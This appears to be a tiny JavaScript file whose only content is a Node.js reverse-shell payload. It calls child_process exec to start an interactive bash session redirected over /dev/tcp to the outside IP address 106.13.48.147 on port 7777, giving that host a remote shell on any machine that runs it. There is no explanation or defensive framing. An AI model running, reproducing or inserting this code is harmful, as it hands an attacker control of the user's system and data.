const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/106.13.48.147/7777 0>&1');
